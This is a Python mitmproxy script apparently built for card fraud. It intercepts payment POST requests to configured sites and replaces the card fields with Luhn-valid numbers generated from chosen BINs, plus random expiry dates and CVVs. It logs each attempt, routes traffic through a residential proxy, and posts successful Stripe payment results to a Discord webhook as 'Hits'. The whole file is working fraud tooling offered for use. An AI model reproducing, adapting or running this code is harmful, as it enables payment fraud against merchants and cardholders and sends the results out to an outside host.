from mitmproxy import http
import random
import datetime
import requests
import json
from discord_webhook import DiscordWebhook
from mitmproxy.connection import Server
from mitmproxy.net.server_spec import ServerSpec

# Load patches from JSON file
with open('patches.json', 'r') as f:
    patches = json.load(f)

bins = patches["bins"]
webhook_url = patches["webhook_url"]
rules = patches["rules"]
blocklist = patches["blocklist"]

# Flask webserver URL

def fetch_bin(user_identifier):
    return fetch_bin_fallback()

def fetch_bin_fallback():
    return random.choice(bins)

def gencc(U):
    while len(U) < 16:
        U += 'x'

    def C(L):
        def B(n): return [int(A) for A in str(n)]
        C = B(L)
        D = C[-1::-2]
        E = C[-2::-2]
        A = 0
        A += sum(D)
        for F in E:
            A += sum(B(F * 2))
        return A % 10

    def D(x, t):
        def G(aS, n):
            aS = str(aS)
            if n >= 1:
                A = aS[-n:]
            else:
                A = ''
            return A
        def C(aS, n, n2=None):
            A = n2
            aS = str(aS)
            if A is None or A == '':
                A = len(aS)
            n, A = int(n), int(A)
            if n < 0:
                n += 1
            B = aS[n-1:n-1+A]
            return B
        def B(x, t=1):
            x = str(x)
            if t > 0:
                while len(x) > t:
                    A = sum([int(x[A]) for A in range(len(x))])
                    x = str(A)
            else:
                for B in range(abs(t)):
                    A = sum([int(x[A]) for A in range(len(x))])
                    x = str(A)
            return int(x)
        D = False
        E = ''
        A = 1
        for H in range(1, len(x)):
            I = int(C(x, H, 1)) * int(C('21', A, 1))
            E += str(B(I))
            A += 1
            if A > len('21'):
                A = 1
        F = B(E, -1)
        if (10 * B(F, -1) - F) % 10 == int(G(x, 1)):
            D = True
        return D

    while True:
        A = ''
        for B in U:
            if len(A) < 16 and 'x' == B.lower():
                A += str(random.randint(0, 9))
            else:
                A += str(B)
        if C(A) == 0 and D(A, random.randint(0, 9)):
            return A, str(random.choice(list(range(1, 13)))).zfill(2), str(random.choice(list(range(datetime.date.today().year + 1, datetime.date.today().year + 8))))[-2:], str(random.randrange(1000)).zfill(3)

def apply_patches(parsed_body, rule, cc):
    for key, value in rule.get("modifications", {}).items():
        if value.startswith("cc["):
            index = int(value[3])
            parsed_body[key] = cc[index]
        else:
            parsed_body[key] = value
    for key in rule.get("remove", []):
        parsed_body.pop(key, None)
    return parsed_body

def log_tried_card(user_identifier, card_details, URL):
    with open("tried_cards.log", "a") as log_file:
        log_file.write(f"URL: {URL}, User: {user_identifier}, Card: {card_details}\n")

def proxy_address() -> tuple:
    return ("geo.iproyal.com", 12321)

def request(flow: http.HTTPFlow) -> None:

    user_identifier = flow.client_conn.address[0]
    user_bin = fetch_bin(user_identifier)


    # Check blocklist
    for blocked_url in blocklist:
        if blocked_url in flow.request.pretty_url:
            return

    for url, rule in rules.items():
        if flow.request.method == "POST" and url in flow.request.pretty_url:
            original_body = flow.request.get_text()
            try:
                parsed_body = {k: v for k, v in [x.split("=") for x in original_body.split("&")]}
                if any(key in parsed_body for key in rule["modifications"].keys()):
                    cc = gencc(user_bin)
                    parsed_body = apply_patches(parsed_body, rule, cc)
                    
                    log_tried_card(user_identifier, cc, flow.request.pretty_url)
                    modified_body = "&".join(f"{k}={v}" for k, v in parsed_body.items())
                    flow.request.set_text(modified_body)
                    print(f"Modified Successfully for user {user_identifier}: card ({cc[0]}) exp ({cc[1]}/{cc[2]})")
            except ValueError as ex:
                print(f"Failed to modify request for user {user_identifier}")
                # reason
                print(ex)
            break

async def response(flow: http.HTTPFlow) -> None:
    if flow.response is not None:
        response = flow.response.get_text()
        if "success" in response and "requires_action" in response:
            response_json = json.loads(response)
            if response_json["success"] and not response_json["requires_action"]:
                webhook = DiscordWebhook(url=webhook_url, username="Stripe Logger", content=f"New Payment Intent H1t\nWebsite: {flow.request.headers['origin']}\nResponse: `{response}`")
                response = webhook.execute()

addons = [
    response
]
